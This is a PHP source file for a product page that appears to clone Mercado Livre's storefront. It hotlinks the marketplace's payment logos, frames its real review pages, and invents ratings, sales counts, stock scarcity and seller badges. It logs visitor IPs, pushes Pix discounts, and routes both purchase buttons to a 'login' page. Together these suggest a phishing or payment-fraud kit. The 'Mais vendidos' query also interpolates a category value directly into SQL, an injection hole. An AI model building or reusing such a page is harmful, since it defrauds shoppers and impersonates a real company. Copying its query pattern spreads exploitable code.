<?php
include "config/config.php";
include "classcoderphp/pix.php";
include "valor.php";

include "processa_vis.php";
$hora = date('H:i:s');
$sql = $pdo->prepare("INSERT INTO acessos (ip, hora) VALUES (:ip, :hora)");
$sql->bindValue(":ip", $ip);
$sql->bindValue(":hora", $hora);
$sql->execute();

if(isset($_GET['id'])):

$_SESSION['idprodutook'] = $id = addslashes(htmlspecialchars_decode($_GET['id']));

else:
    ?>
<script>window.location.href="<?= INCLUDE_PATH ?>"</script>
<?php
endif;

 global $pdo;
 $array=[];
 $sql=$pdo->prepare("SELECT * FROM coderphp_produtos WHERE id=:id");
 $sql->bindValue(":id", $id);
 $sql->execute();

 if($sql->rowCount() > 0){
    $array = $sql->fetchAll();
 }

 foreach($array as $coderphp):
        $_SESSION['id'] = $coderphp['id'];
        $_SESSION['title'] = $coderphp['title'];
        $_SESSION['fotos1'] = $coderphp['fotos1'];
         $_SESSION['fotos2'] = $coderphp['fotos2'];
          $_SESSION['fotos3'] = $coderphp['fotos3'];
           $_SESSION['fotos4'] = $coderphp['fotos4'];
             $_SESSION['fotos5'] = $coderphp['fotos5'];
        $_SESSION['preco'] = $coderphp['preco'];
         $coderphp['descricao'];
$_SESSION['avalicao'] =  $coderphp['avalicao'];
         $_SESSION['categoria'] = $coderphp['categoria'];

       $categoriaprodutos = $coderphp['categoria'];



$altura = number_format(str_replace(",",".",str_replace(".","",$coderphp['preco'])), 2, '.', '');
 $valortotao = $altura;

 @$valor_com_desconto = $valortotao - ($valortotao * $pctm * 0.01);
 $valor_com_desconto;
$dois = $valor_com_desconto;

                         $parcelas = 10;
    $valor = $dois; 
    $_SESSION['novovalor'] = $valorTotal = number_format($valor, 2, '.', '');
    $valor_parcela = $valorTotal / $parcelas;
endforeach;

?>

<section class="procudescomoboile">
    <div class="container-fluid">
        <div class="row">
            <div class="col-6"><span style="color:#0000008c;font-size:11px;">Novo | +50mil vendidos</span></div>
            <div class="col-6"><div style="float:right;">
                <span style="color:#0000008c;font-size:11px;">4.8 
                <i style="color:#3483fa;" class="fa-solid fa-star"></i> <i style="color:#3483fa;" class="fa-solid fa-star"></i> <i style="color:#3483fa;" class="fa-solid fa-star"></i> <i style="color:#3483fa;" class="fa-solid fa-star"></i> <i style="color:#3483fa;" class="fa-solid fa-star"></i> (4827)</span>
            </div>
            </div>
        </div>

        <div class="row">
            <div class="col-12">
                <span style="text-align: center;font-size:9.6px;background:rgb(255, 119, 51);width:80px;padding:3px;color:white;border-radius:5px;">MAIS VENDIDO</span> <span style="margin-left:5px;color:#3483fa;font-size:11px;">1º em <?=$_SESSION['categoria']?></span>
                <br>

                <p style="color:#000000e6;line-height: 20px;margin-top:10px;"><?= $_SESSION['title'] ?></p>
            </div>
        </div>

        <div class="row">
            <div class="col-12">
                  <div class="swiper">
        <div class="swiper-wrapper">
            <div class="swiper-slide"><img style="width:100%;height:290px !important;" src="<?= $_SESSION['fotos1'] ?>" alt="Imagem 1"></div>
            <div class="swiper-slide"><img style="width:100%;height:290px !important;" src="<?= $_SESSION['fotos2'] ?>" alt="Imagem 2"></div>
            <div class="swiper-slide"><img style="width:100%;height:290px !important;" src="<?= $_SESSION['fotos3'] ?>" alt="Imagem 3"></div>
            <div class="swiper-slide"><img style="width:100%;height:290px !important;" src="<?= $_SESSION['fotos4'] ?>" alt="Imagem 4"></div>
        </div>
        <!-- Adicione botões de navegação (opcional) -->
       
        <!-- Adicione paginação (opcional) -->
        <div class="swiper-pagination"></div>
    </div>
            </div>
        </div>
<br>

        <div class="row">
            <div class="col-12">
                <span style="color:#0000008c"><s>R$ <?=$coderphp['preco'] ?></s></span><br>
                <span style="font-size:1.8em;">R$ <?=  number_format(@$dois,2,",",".") ?></span>
                <span style="margin-left:10px;position:absolute;margin-top:12px;font-size:13px;color:#00a650;"> <?= $pctm ?>% OFF no Pix</span><br>
                <span style="font-weight:400;font-size:13px;">OU  <?=  'R$ '. number_format($valor_parcela, 2, ',', '.');  ?> em <?=$parcelas?>x vezes</span>
                <br>
                <span style='font-weight:600;font-size:11px;color:white;width:150px;heigt:auto;padding:4px;border-radius:4px;background:rgb(52, 131, 250);'>OFERTA DO DIA</span>
            </div>
        </div>

        <br>
             <span style="font-size:14px;font-weight: 500;">Envio para todo o país</span><br>
                           <span style="font-size:12px;color:rgba(0, 0, 0, .55);">Saiba os prazos de entrega e as formas de envio.</span><br>
                           <span style="color:#3483fa;font-size:14px;">Calcular o prazo de entrega</span><br><br>
                           <span style="font-weight: 600;">Estoque disponível</span><br>
                           <span style="font-size:13px;color:rgba(0, 0, 0, .55);">Armazenado e enviado pelo</span> <span><i style="color:rgb(0, 166, 80);" class="fa-solid fa-bolt-lightning"></i> </span></span><span style="color:rgb(0, 166, 80);font-style: italic;font-weight:600;font-size:14px">FULL</span><br>
<br>
                           <span style="font-size:13px;color:rgb(20,20,20)">Quantidade:</span>
<span style="font-size:13px;color:rgb(20,20,20);font-weight: 500;">1 unidade</span>
<span style="font-size:13px;color:rgba(0, 0, 0, .55);">(5 disponíveis)</span><br><br>

<span style="color:#00a650;font-weight:400;font-size:13px;">Frete grátis comprando 2 ou mais unidades</span>     


<br><br>
<button onclick="window.location.href='login'" style="font-size:15px;outline:none;border:none;width:100%;height:auto;padding:12px;color:white;border-radius:8px;background:#3483fa;">Comprar Agora</button>
<button onclick="window.location.href='login'" style="margin-top:10px;font-size:15px;outline:none;border:none;width:100%;height:auto;padding:12px;color:#3483fa;border-radius:8px;background: rgb(227, 237, 251)">Adicionar ao Carrinho</button>
<br><br>
<span style="font-size:13px;color: rgba(0, 0, 0, .9);
    font-weight: 300;
    margin-right: 2px;">Vendido por <span style="color: #3483fa;
    cursor: pointer;
    font-size: 13px;
    font-weight: 400;">JSVAREJOS</span></span>
    <br>
    <span style="font-size:13px;color: rgba(0, 0, 0, .9);
    font-weight: 300;
    margin-right: 2px;">MercadoLíder | <span style="font-size: 13px;font-weight: 600;">+1000 vendas</span></span>
<br><br>

<span style="float:left;"><i style="color:rgba(0, 0, 0, .55);" class="fa-solid fa-arrows-turn-to-dots"></i></span> 
<span style="position:relative;left:20px;float:left;color:rgba(0, 0, 0, .55);font-size:13px;"><span style="color:#3483fa;">Devolução grátis.</span> Você tem 30 dias a <br> partir da data de recebimento.</span>
<br><br>
<div style="clear:both;"></div>
<span style="float:left;"><i style="color:rgba(0, 0, 0, .55);" class="fa-regular fa-circle-check"></i></span> 
<span style="position:relative;left:20px;float:left;color:rgba(0, 0, 0, .55);font-size:13px;"><span style="color:#3483fa;">Compra garantida.</span>  receba o produto <br> que está esperando ou devolvemos <br> o dinheiro.</span>
<br><br><br>
<div style="clear:both;"></div>
<span style="float:left;"><i style="color:rgba(0, 0, 0, .55);" class="fa-solid fa-circle-check"></i></span> 
<span style="position:relative;left:20px;float:left;color:rgba(0, 0, 0, .55);font-size:13px;"><span style="color:#3483fa;"></span>  12 meses de garantia de fábrica.</span>

<div style="clear:both;">
    <br>
    <hr>
<br>
<div class="row">
    <p style="font-size:1.4em;font-weight:300;">Fotos do produto</p>
    <br>

    <div class="col-12">
        <center><img border="0" height="140px" src="<?= $_SESSION['fotos1'] ?>" alt=""></center>
        <br>
<br>
    </div>


     <div class="col-12">
        <center><img border="0" height="140px" src="<?= $_SESSION['fotos2'] ?>" alt=""></center>
        <br>
        <br>
    </div>


     <div class="col-12">
        <center><img border="0" height="140px" src="<?= $_SESSION['fotos3'] ?>" alt=""></center>
        <br>
        <br>
    </div>

     <div class="col-12">
        <center><img border="0" height="140px" src="<?= $_SESSION['fotos4'] ?>" alt=""></center>
        <br>
        <br>
    </div>
</div>

<br>



     <div class="row">

                         <div class="descricaodesktop">
                                 <p style="font-weight: 600;font-size:2em;">Descrição</p>
                                 <p><?= trim(nl2br($coderphp['descricao'])) ?></p>
                         </div>
                  </div>

                  <br>


<p style="font-size:18px;font-weight:400;margin-top:15px;">Meios de pagamento</p>
                      
                      <button style="font-size:14px;border:none;width:100%;heigth:auto;padding:12px;color:white;background:rgb(0, 166, 80);border-radius:4px;"><i class="fa-solid fa-credit-card"></i> Pague em até 18x sem juros!</button>
                      <p style="font-weight:300;margin-top:15px;">Linha de Crédito</p>
                      <img src="https://http2.mlstatic.com/storage/logos-api-admin/b4534650-571b-11e8-95d8-631c1a9a92a9-m.svg" alt="">
                      <br><br>
                      <p style="font-weight:300;">Cartões de crédito</p>
                      <img src="https://http2.mlstatic.com/storage/logos-api-admin/ddf23a60-f3bd-11eb-a186-1134488bf456-m.svg" alt="">
                      <img src="https://http2.mlstatic.com/storage/logos-api-admin/37f7b160-6278-11ec-ae75-df2bef173be2-m.svg" alt="">
                      <img src="https://http2.mlstatic.com/storage/logos-api-admin/a5f047d0-9be0-11ec-aad4-c3381f368aaf-m.svg" alt="">
                      <br>
                      <img src="https://http2.mlstatic.com/storage/logos-api-admin/aa2b8f70-5c85-11ec-ae75-df2bef173be2-m.svg" alt="">
                      <br><br>
                      <p style="font-weight:300;">Cartões de débito</p>
                      <img src="https://http2.mlstatic.com/storage/logos-api-admin/1e7db140-6f0b-11ec-813c-8542a9aff8ea-m.svg" alt="">
                      <img src="https://http2.mlstatic.com/storage/logos-api-admin/d2407420-f3bd-11eb-8e0d-6f4af49bf82e-m.svg" alt="">
                      <br><br>
                      <p style="font-weight:300;">Pix

<br>
<img src="https://http2.mlstatic.com/storage/logos-api-admin/f99fcca0-f3bd-11eb-9984-b7076edb0bb7-m.svg" alt="">
       
       <br><br>

         <iframe frameborder="0px" style='width:100%;height:1000px' src="


                        https://produto.mercadolivre.com.br/noindex/catalog/reviews/<?= $_SESSION['avalicao'] ?>?noIndex=true&access=view_all&modal=true%22">
                        
                            


                        </iframe>
    </div>
</section>


<section class="ppaginaok00101001">
	<div class="container-fluid">
		
        <p style="font-size:14px;"><?=$coderphp['title']?></p>
<div class="backgroundwhite">
        <div class="row">
        	
        		<div class="col-md-9">
                  <div class="row">
                          <div class="col-md-1">
                <img class="sadkasjdkimg thumbnail" style="width:100%;" src="<?= $_SESSION['fotos1'] ?>" alt="">

                <img class="sadkasjdkimg thumbnail" style="width:100%;" src="<?= $_SESSION['fotos2'] ?>" alt="">

                <img class="sadkasjdkimg thumbnail" style="width:100%;" src="<?= $_SESSION['fotos3'] ?>" alt="">

                <img class="sadkasjdkimg thumbnail" style="width:100%;" src="<?= $_SESSION['fotos4'] ?>" alt="">
                <img class="sadkasjdkimg thumbnail" style="width:100%;" src="<?= $_SESSION['fotos5'] ?>" alt="">
                         </div>
                         <div class="col-md-5" id="mainImage">
                                <center><img style="width:100%;" src="<?= $_SESSION['fotos1'] ?>" alt=""></center>

                               
                         </div>
                         <div class="col-md-6">
                         <br>
                                <span style="float:left;color:rgba(0, 0, 0, .55);font-weight:300;font-size:13px;">Novo | +5mil vendidos</span>
                                <span style="float:right;"><i style="cursor:pointer;color:rgb(52, 131, 250);font-size:22px;" class="fa-regular fa-heart"></i></span>
                                <div style="clear:both;"></div>
                                <span style="font-weight:600;font-size:12px;width:170px;height:auto;padding:5px;border-radius:4px;color:white;background:rgb(255, 119, 51)">MAIS VENDIDO</span>
                                <span style="color:#3483fa;font-size:11px;">1º em <?=$_SESSION['categoria']?></span>
                                <h1 style="margin-top:10px;font-size:22px;"><?=$coderphp['title']?></h1>
                                <span style="color:rgba(0, 0, 0, .55);font-weight:300;font-size:13px;">4.8</span>
                                <span><i style="color:rgb(52, 131, 250);font-size:14px;" class="fa-solid fa-star"></i> <i style="color:rgb(52, 131, 250);font-size:14px;" class="fa-solid fa-star"></i> <i style="color:rgb(52, 131, 250);font-size:14px;" class="fa-solid fa-star"></i> <i style="color:rgb(52, 131, 250);font-size:14px;" class="fa-solid fa-star"></i> <i style="color:rgb(52, 131, 250);font-size:14px;" class="fa-solid fa-star"></i></span>
                                <span style="color:rgba(0, 0, 0, .55);font-weight:300;font-size:13px;">(3224)</span>
                                <br><br>
                                <span style='font-weight:600;font-size:11px;color:white;width:150px;heigt:auto;padding:4px;border-radius:4px;background:rgb(52, 131, 250);'>OFERTA DO DIA</span><br>
                                <span style="color:rgba(0, 0, 0, .55);position:absolute;margin-top:10px;"><s>R$ <?=$coderphp['preco'] ?></s></span>
<br>
<span style="font-size:2.2rem;font-weight:400">R$
<?=  number_format(@$dois,2,",",".") ?></span>








                         </div>  
                  </div>   
<hr>
<br>
                  <div class="row">

                         <div class="descricaodesktop">
                                 <p style="font-weight: 600;font-size:2em;">Descrição</p>
                                 <p><?= trim(nl2br($coderphp['descricao'])) ?></p>
                         </div>
                  </div>   

                  <div class="row">
                         <p style="color:rgb(0, 0, 49);font-size:2rem;">Opiniões do produto</p> 

                        <br>

                        <div class="col-md-12">
                        <p style='width:100%;height:1px;background:rgb(220,220,220);'></p>
                        <br>
                        
                        <iframe frameborder="0px" style='width:100%;height:1000px' src="


                        https://produto.mercadolivre.com.br/noindex/catalog/reviews/<?= $_SESSION['avalicao'] ?>?noIndex=true&access=view_all&modal=true%22">
                        
                            


                        </iframe>
                    </div>
                  </div>      
                        </div>

        		 <div class="col-md-3">
                   <div class="asdjkasdj01001">
                           <span style="font-size:14px;font-weight: 500;">Envio para todo o país</span><br>
                           <span style="font-size:12px;color:rgba(0, 0, 0, .55);">Saiba os prazos de entrega e as formas de envio.</span><br>
                           <span style="color:#3483fa;font-size:14px;">Calcular o prazo de entrega</span><br><br>
                           <span style="font-weight: 600;">Estoque disponível</span><br>
                           <span style="font-size:13px;color:rgba(0, 0, 0, .55);">Armazenado e enviado pelo</span> <span><i style="color:rgb(0, 166, 80);" class="fa-solid fa-bolt-lightning"></i> </span></span><span style="color:rgb(0, 166, 80);font-style: italic;font-weight:600;font-size:14px">FULL</span><br>
<br>
                           <span style="font-size:13px;color:rgb(20,20,20)">Quantidade:</span>
<span style="font-size:13px;color:rgb(20,20,20);font-weight: 500;">1 unidade</span>
<span style="font-size:13px;color:rgba(0, 0, 0, .55);">(5 disponíveis)</span><br><br>

<span style="color:#00a650;font-weight:400;font-size:13px;">Frete grátis comprando 2 ou mais unidades</span>     


<br><br>
<button onclick="window.location.href='login'" style="font-size:15px;outline:none;border:none;width:100%;height:auto;padding:12px;color:white;border-radius:8px;background:#3483fa;">Comprar Agora</button>
<button onclick="window.location.href='login'" style="margin-top:10px;font-size:15px;outline:none;border:none;width:100%;height:auto;padding:12px;color:#3483fa;border-radius:8px;background: rgb(227, 237, 251)">Adicionar ao Carrinho</button>
<br><br>
<span style="font-size:13px;color: rgba(0, 0, 0, .9);
    font-weight: 300;
    margin-right: 2px;">Vendido por <span style="color: #3483fa;
    cursor: pointer;
    font-size: 13px;
    font-weight: 400;">JSVAREJOS</span></span>
    <br>
    <span style="font-size:13px;color: rgba(0, 0, 0, .9);
    font-weight: 300;
    margin-right: 2px;">MercadoLíder | <span style="font-size: 13px;font-weight: 600;">+1000 vendas</span></span>
<br><br>

<span style="float:left;"><i style="color:rgba(0, 0, 0, .55);" class="fa-solid fa-arrows-turn-to-dots"></i></span> 
<span style="position:relative;left:20px;float:left;color:rgba(0, 0, 0, .55);font-size:13px;"><span style="color:#3483fa;">Devolução grátis.</span> Você tem 30 dias a <br> partir da data de recebimento.</span>
<br><br>
<div style="clear:both;"></div>
<span style="float:left;"><i style="color:rgba(0, 0, 0, .55);" class="fa-regular fa-circle-check"></i></span> 
<span style="position:relative;left:20px;float:left;color:rgba(0, 0, 0, .55);font-size:13px;"><span style="color:#3483fa;">Compra garantida.</span>  receba o produto <br> que está esperando ou devolvemos <br> o dinheiro.</span>
<br><br><br>
<div style="clear:both;"></div>
<span style="float:left;"><i style="color:rgba(0, 0, 0, .55);" class="fa-solid fa-circle-check"></i></span> 
<span style="position:relative;left:20px;float:left;color:rgba(0, 0, 0, .55);font-size:13px;"><span style="color:#3483fa;"></span>  12 meses de garantia de fábrica.</span>

<div style="clear:both;"></div>

              </div> 


              <div class="asdakjdad">
                      <p style="font-size:18px;font-weight:400;margin-top:15px;">Meios de pagamento</p>
                      
                      <button style="font-size:14px;border:none;width:100%;heigth:auto;padding:12px;color:white;background:rgb(0, 166, 80);border-radius:4px;"><i class="fa-solid fa-credit-card"></i> Pague em até 18x sem juros!</button>
                      <p style="font-weight:300;margin-top:15px;">Linha de Crédito</p>
                      <img src="https://http2.mlstatic.com/storage/logos-api-admin/b4534650-571b-11e8-95d8-631c1a9a92a9-m.svg" alt="">
                      <br><br>
                      <p style="font-weight:300;">Cartões de crédito</p>
                      <img src="https://http2.mlstatic.com/storage/logos-api-admin/ddf23a60-f3bd-11eb-a186-1134488bf456-m.svg" alt="">
                      <img src="https://http2.mlstatic.com/storage/logos-api-admin/37f7b160-6278-11ec-ae75-df2bef173be2-m.svg" alt="">
                      <img src="https://http2.mlstatic.com/storage/logos-api-admin/a5f047d0-9be0-11ec-aad4-c3381f368aaf-m.svg" alt="">
                      <br>
                      <img src="https://http2.mlstatic.com/storage/logos-api-admin/aa2b8f70-5c85-11ec-ae75-df2bef173be2-m.svg" alt="">
                      <br><br>
                      <p style="font-weight:300;">Cartões de débito</p>
                      <img src="https://http2.mlstatic.com/storage/logos-api-admin/1e7db140-6f0b-11ec-813c-8542a9aff8ea-m.svg" alt="">
                      <img src="https://http2.mlstatic.com/storage/logos-api-admin/d2407420-f3bd-11eb-8e0d-6f4af49bf82e-m.svg" alt="">
                      <br><br>
                      <p style="font-weight:300;">Pix

<br>
<img src="https://http2.mlstatic.com/storage/logos-api-admin/f99fcca0-f3bd-11eb-9984-b7076edb0bb7-m.svg" alt="">
              </div>             
                         </div>
        	</div>
        </div>
	 </div>
</section>

<section class="categoralklkdklaskdad">
    <div class="container-fluid">
         <div class="row"> <div class="reeeeee" style="box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .12);width:100%;height:auto;padding:20px;background:white;border-radius:4px;">
            <h2 style="font-size:18px;color:rgb(25, 25, 25);">Mais vendidos </h2>
                    <div class="row">

<?php 
                global $pdo;
                $array = [];
                $sql=$pdo->prepare("SELECT * FROM coderphp_produtos WHERE categoria = '$categoriaprodutos' ORDER BY RAND() LIMIT 6  ");
                $sql->execute();
                if($sql->rowCount() > 0){
                    $array = $sql->fetchAll();
                }

        


                foreach($array as $coderphp):
                    $altura = number_format(str_replace(",",".",str_replace(".","",$coderphp['preco'])), 2, '.', '');
             
 $valortotao = $altura;

 @$valor_com_desconto = $valortotao - ($valortotao * $pctm * 0.01);
 $valor_com_desconto;
$dois = $valor_com_desconto;

                         $parcelas = 10;
    $valor = $dois; 
    $valorTotal = number_format($valor, 2, '.', '');
    $valor_parcela = $valorTotal / $parcelas;
    
                      


    $url = $coderphp['title'];
  $a = 'ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖØÙÚÛÜüÝÞßàáâãäåæçèéêëìíîïðñòóôõöøùúûýýþÿŔŕ"!@#$%&*()_-+={[}]/?;:.,\\\'<>°ºª';
  $b = 'aaaaaaaceeeeiiiidnoooooouuuuuybsaaaaaaaceeeeiiiidnoooooouuuyybyRr                                 ';  
  $url = utf8_decode($url);
  $url = strtr($url, utf8_decode($a), $b);
  $url = strip_tags(trim($url));
  $url = str_replace(" ","-",$url);
  $url = str_replace(array("-----","----","---","--"),"-",$url);


               

                ?>


                        <div class="col-md-2 col-6" style="margin-bottom:15px;">
                         <a href="product?id=<?= $coderphp['id'] ?>&<?= $url ?>" style="text-decoration:none;">
                   
                        
                        <center><img class="imgresppp" title="<?= $coderphp['title'] ?>" border="0" height="140px" src="<?= $coderphp['fotos1'] ?>" alt=""></center>
                        <br>

                        <p style="color:rgb(25, 25, 25);font-size:13px;line-height: 22px;"><?= substr($coderphp['title'], 0, 70) . '...' ?></p>


                        <span style="color: rgba(0, 0, 0, .55);"><s>R$ <?= $coderphp['preco'] ?></s></span><br>
                        <span style="color:rgb(0, 0, 0);font-size:20px;font-weight:500;">R$ <?=  number_format(@$dois,2,",",".") ?></span>
                        
                        <span style="font-weight:500;top:-3px;position:relative;margin-left:5px;color:rgb(0, 166, 80);font-size:18px;"><?= $pctm ?>% OFF</span><br>


                        <span style="font-size:13px;color:rgb(130, 130, 130)">em </span> 
                        <span style="font-size:13px;line-height: 22px;color:rgb(0, 166, 80)"><?=$parcelas?>x <?=  'R$ '. number_format($valor_parcela, 2, ',', '.');  ?> sem juros</span> <br>
                        <span style="font-size:14px;line-height: -2px;color:rgb(0, 166, 80);font-weight: 600;">Frete grátis <span><i class="fa-solid fa-bolt-lightning"></i> </span></span><span style="color:rgb(0, 166, 80);font-style: italic;font-weight:600;font-size:14px">FULL</span>
                  
                </a>
                  </div>

<?php 

endforeach;

?>

                  

                  
                    </div>


                    </div>


                </div>
    </div>
</section>


<script src="https://code.jquery.com/jquery-3.7.1.js"></script>
<script>$(document).ready(function() {
    // Quando o mouse passar por cima de uma miniatura
    $('.thumbnail').mouseover(function() {
        // Obtém o src da imagem que o mouse está passando
        var imgSrc = $(this).attr('src');
        
        // Atualiza a div principal com a imagem correspondente
        $('#mainImage').html('<img src="' + imgSrc + '" width="300">');
    });
});
</script>